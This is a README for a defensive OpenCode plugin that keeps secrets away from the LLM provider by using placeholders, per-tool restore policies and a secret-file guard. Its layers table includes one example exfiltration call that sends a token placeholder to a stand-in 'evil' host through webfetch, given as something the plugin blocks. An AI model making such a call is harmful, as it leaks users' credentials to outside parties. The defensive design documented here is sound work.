# opencode-vibeguard-v2

VibeGuard for OpenCode **V2** (tested on **2.0.32**). Originally ported from the V1 plugin
[`opencode-vibeguard@0.1.0`](https://github.com/inkdust2021/opencode-vibeguard) (MIT, by inkdust2021).

Secrets, passwords and other sensitive values reach the LLM provider **only as placeholders**
(`__VG_<NAME>_<hash12>__`). Real values are restored locally: right before a tool runs, and in the
streamed answer you see.

```
you / files / tools ──► [structural redaction] ──► [raw payload safety net] ──► provider
                                                                               │
tool runs with real value ◄── [per-tool restore policy] ◄── placeholders ◄─────┘
answer shows real value   ◄── [stream restore, text only]
```

## Layers

| # | Layer | OpenCode V2 hook | Purpose |
|---|-------|------------------|---------|
| 1 | Known secrets | – | Exact values from a secrets list, env vars, OpenCode `auth.json`, password-manager commands, protected files (+ base64 / URL variants). Stable named placeholders that survive restarts. |
| 2 | Pattern detection | – | 40+ provider token formats, full private-key blocks, URL passwords, auth headers, JWTs, `password = ...` assignments (value only, with false-positive filters). Optional PII (email, IBAN, credit card, ...). |
| 3 | Structural redaction | `session.hook("context" \| "compaction" \| "generate" \| "title")` | System parts, text/reasoning/compaction parts, tool-call inputs and tool results (copy-on-write), text attachments. Adds a short system hint explaining placeholders. |
| 4 | Raw safety net | `session.hook("http.request")`, `experimental.ws.send` | Scans the final provider payload for known values (incl. JSON-escaped forms) and strong token formats. `redact` or `block`. With `debug`, logs the JSON paths (never values) of anything layer 3 missed. |
| 5 | Tool restore policy | `tool.hook("execute.before")` | Restores real values for local tools. Per tool: `allow` / `ask` (permission prompt, once per session) / `deny` / `keep`. Prevents exfiltration such as `webfetch("https://evil/?k=__VG_TOKEN__")`. Unknown/invented placeholders fail the call instead of being written into files. |
| 6 | Stream restore | `session.hook("http.response")`, `experimental.ws.receive` | Restores placeholders in streamed **answer text** (SSE: OpenAI chat/Responses, Anthropic, Gemini), with a hold-back buffer for placeholders split across token deltas. Tool arguments and reasoning stay untouched. |
| 7 | Secret-file guard | `permission.hook("evaluate")` | Denies `read` of registered secret files (secrets lists, protected files, `auth.json`, `opencode.db`) and asks before `shell` commands that reference them. |
| – | Prompt at rest (opt-in) | `session.hook("prompt")` | `redact_prompt: true` stores your prompt with placeholders. |

Everything fails closed by default: if redaction throws, the model request is blocked.

## Install

```sh
git clone -b opencode-2.0.32 https://github.com/olobarius/opencode-vibeguard-v2.git
```

Add the absolute path to `plugins` in `~/.config/opencode/opencode.jsonc`:

```jsonc
{ "plugins": ["C:/Users/me/opencode-plugins/opencode-vibeguard-v2"] }
```

Then create the config and your secrets list:

```sh
cp vibeguard.config.jsonc.example ~/.config/opencode/vibeguard.config.jsonc
cp vibeguard.secrets.example      ~/.config/opencode/vibeguard.secrets   # then edit
```

Restart the OpenCode service (`opencode service restart`). Without a config the plugin is a
no-op and logs a loud `DISABLED` error. Plugin `options` from `opencode.jsonc` are merged over
the file config (or replace it when no file exists).

Zero runtime dependencies; Node builtins only. Works in OpenCode's Bun runtime and Node 20+.

## The secrets list (recommended)

Pattern detection cannot know your Wi-Fi password, a customer name or a bare hex token. List
them, and they are matched exactly, everywhere, including base64 and URL-encoded copies:

```dotenv
# ~/.config/opencode/vibeguard.secrets
GITHUB_PAT=github_pat_11AB...
DB_PASSWORD="correct horse battery staple"
CUSTOMER_NAME="Acme Rocket Corp"
my-old-wifi-password
```

* `NAME=value` produces `__VG_NAME_<hash>__`; bare lines produce `__VG_SECRET_<hash>__`.
* Placeholders derive from a per-installation master key (plugin storage), so they are
  stable across sessions and restarts. They can always be restored, even after compaction.
* The file is hot-reloaded (`secrets.reload_interval`) and blocked for `read` by the model.
* A project-local list `.opencode/vibeguard.secrets` is also read.

Other known-value sources (on by default): env vars with sensitive names (`*_TOKEN`,
`*_SECRET`, `*PASSWORD*`, `*_API_KEY`, `DATABASE_URL`, ...) and OpenCode's own credential store.
Password managers: `secrets.commands` (e.g. `pass`, `op read`, `Get-Secret`).

## Config

Lookup order (first match wins): `$OPENCODE_VIBEGUARD_CONFIG`, `./vibeguard.config.json(c)`,
`./.opencode/vibeguard.config.json(c)`, `~/.config/opencode/vibeguard.config.json(c)`.
JSONC comments and trailing commas are allowed; UTF-8 BOM is tolerated.

See [`vibeguard.config.jsonc.example`](vibeguard.config.jsonc.example) for every option with
defaults and comments.

### Tool restore policy

```jsonc
"restore": {
  "tools": {
    "execute": "keep",          // Code Mode: placeholders stay; nested tool calls are checked individually
    "webfetch": "ask",          // permission prompt "vibeguard_secret" (once per session + tool)
    "websearch": "deny",        // the call fails with an explanatory error
    "chrome-devtools_*": "ask", // MCP tools: <server>_<tool>, wildcards allowed
    "*": "allow"
  }
}
```

A user-supplied `tools` object replaces the defaults, so keep a trailing `"*"` rule.

## Pairing with cc-safety-net

[cc-safety-net](https://github.com/kenryu42/cc-safety-net) blocks destructive commands and
secret-file access by static analysis of shell commands (PowerShell and POSIX) and tool calls.
VibeGuard layer 7 is a lightweight subset for registered files only. Running both is
recommended: cc-safety-net keeps secrets out of the session, VibeGuard keeps whatever got in
away from the provider. With `"import_deny_paths": true`, files on cc-safety-net's
`secret_protection.deny_paths` list become known secrets here too. Manage that list with
`node scripts/add-deny-path.mjs` (works without cc-safety-net installed).

## Limits

* Redaction is text-based. Images and PDFs are not inspected (text attachments are).
* Detection of unknown secrets is heuristic. Put anything important in the secrets list.
* Tool-call arguments in the transcript show placeholders (by design: the policy decides at
  execution time). The model's reasoning keeps placeholders, because providers echo reasoning
  back through provider metadata and some sign it.
* Plugins calling `ctx.generate.text` bypass session hooks; their requests are not redacted.
* The local transcript (`opencode.db`) still contains secrets you typed, unless `redact_prompt`
  is enabled, and tool outputs as produced.

## Debug

`"debug": true` or `OPENCODE_VIBEGUARD_DEBUG=1` writes counts-only JSON lines to
`<tmpdir>/opencode-vibeguard-trace.log`: `load`, `request`, `http.request` (+ `paths` of
anything the structural pass missed), `http.response`, `tool.restore`, `tool.deny`,
`protect.read`, ...

## Development

```sh
npm test                                   # Node
BUN_BE_BUN=1 opencode-cli test ./test/     # OpenCode's own Bun runtime
```

## License

MIT. Original plugin and VibeGuard placeholder format by inkdust2021.
